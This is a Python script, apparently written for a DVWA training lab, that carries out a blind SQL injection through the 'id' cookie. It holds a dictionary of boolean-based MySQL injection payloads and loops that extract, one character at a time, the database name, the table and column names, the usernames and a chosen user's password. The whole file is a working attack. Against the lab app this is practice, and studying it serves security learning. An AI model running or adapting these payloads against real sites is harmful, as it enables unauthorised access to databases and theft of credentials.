from utils import *
from ast import literal_eval
def get_query_result(s, sqli_blind_url, query, *args):
    try:
        concrete_query = query.format(*args)
        s._session.cookies.set("id", concrete_query)
        response = s.get(sqli_blind_url)
        parser = DVWASQLiResponseParser(response)

        return parser.check_presence("exist")
    except AttributeError as e:
        return False


queries = {
    "db_length": "1' AND LENGTH(DATABASE()) = {} #",
    "db_name": "1' AND SUBSTRING(DATABASE(), {}, 1) = '{}' #",
    "n_tables": "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_type='base table' AND table_schema='{}')='{}' #",
    "tables": "1' AND SUBSTR((SELECT table_name from information_schema.tables WHERE table_type='base table' AND table_schema='{}' {} LIMIT 1),{},1)='{}' #",
    "n_columns": "1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}')='{}' #",
    "columns": "1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {}, 1),{},1)='{}' #",
    "users": "1' AND SUBSTR((SELECT {} FROM {} LIMIT {}, 1),{},1)='{}' #",
    "pwd_len": "1' AND LENGTH((SELECT {} FROM {} WHERE {}='{}'))={} #",
    "pwd": "1' AND SUBSTR((SELECT {} FROM {} WHERE {}='{}' LIMIT 1), {}, 1)='{}' #"
}

if __name__ == "__main__":
    BASE_URL = "http://10.10.87.65"
    sqli_blind_url = f"{BASE_URL}/vulnerabilities/sqli_blind/#"
    
    with DVWASessionProxy(BASE_URL) as s:
        s.security = SecurityLevel.HIGH


        query = queries["db_length"]
        length = 0
        for i in range(1,10):
            if get_query_result(s, sqli_blind_url, query, i):
                print(f"[+] The DB's name length is {i}")
                length = i
                break

        
        query = queries["db_name"]
        dbname = []

        for i in range(1, length+1):
            for c in string.ascii_lowercase:
                if get_query_result(s, sqli_blind_url, query, i, c):
                    dbname.append(c)
                    break
        dbname = "".join(dbname)
        print(f'[+] Found a database with name: {dbname}')
        
        
        query = queries["n_tables"]
        n_tables = 0
        for i in range(1, 10):
            if get_query_result(s, sqli_blind_url, query, dbname, i):
                print(f"[+] It has {i} tables")
                n_tables = i
                break


        query = queries["tables"]
        
        found_tables = [[] for _ in range(n_tables)]
        completion = ""
        for i in range(n_tables):        
            for j in range(1, 10):
                for c in string.ascii_lowercase:
                    if get_query_result(s, sqli_blind_url, query, dbname, completion, j, c):
                        found_tables[i].append(c)
                        break
            print("\t","".join(found_tables[i]))
            completion += f" AND table_name <> '{(''.join(found_tables[i]))}'"
        
            
    
    users_table = input("Type the tabname to attack: ")
    query = queries["n_columns"]
    
    n_columns = 0
    for i in range(1, 10):
        if get_query_result(s, sqli_blind_url, query, users_table, i):
            print(f"[+] It has {i} columns")
            n_columns = i
            break

    query = queries["columns"]
    
    found_columns = [[] for _ in range(n_columns)]
    completion = ""
    print("[!] In order to speed up, try to press CTRL+C when you find the user and password columns")
    try:
        for i in range(n_columns):        
            for j in range(1, 12):
                for c in string.ascii_lowercase:
                    if get_query_result(s, sqli_blind_url, query, users_table, i, j, c):
                        found_columns[i].append(c)
                        
                        break
            print("\t","".join(found_columns[i]))
    except KeyboardInterrupt as e:
        print("\nSkipping this phase!")
    

    users_column = input("Type the name of the column containing usernames: ")
    passwords_column = input("Type the name of the column containing passwords: ")

    query = queries["users"]
    
    found_users = [[] for _ in range(10)]
    
    print("[!] In order to speed up, try to press CTRL+C when you find the target user")
    try:
        for i in range(10):        
            for j in range(1, 12):
                for c in string.ascii_letters+string.digits:
                    if get_query_result(s, sqli_blind_url, query, users_column, users_table, i, j, c):
                        found_users[i].append(c)
                        
                        break
            print("\t","".join(found_users[i]))
    except KeyboardInterrupt as e:
        print("\n Skipping this phase!")
    
    username = input("Type the name of the target user: ")

    query = queries["pwd_len"]
    pwd_length = 0
    for i in range(100):
        
        if get_query_result(s, sqli_blind_url, query, passwords_column, users_table, users_column, username, i ):
            pwd_length = i
            print(f"[+] The password length is: {i}")
        
    query = queries["pwd"]
    password = []
    for j in range(1, pwd_length+1):
        
        for c in string.ascii_letters+string.digits:
            
            if get_query_result(s, sqli_blind_url, query, passwords_column, users_table, users_column, username, j, c):
                password.append(c)
                
                break
    print("[+] Password is: ","".join(password))  
    

        

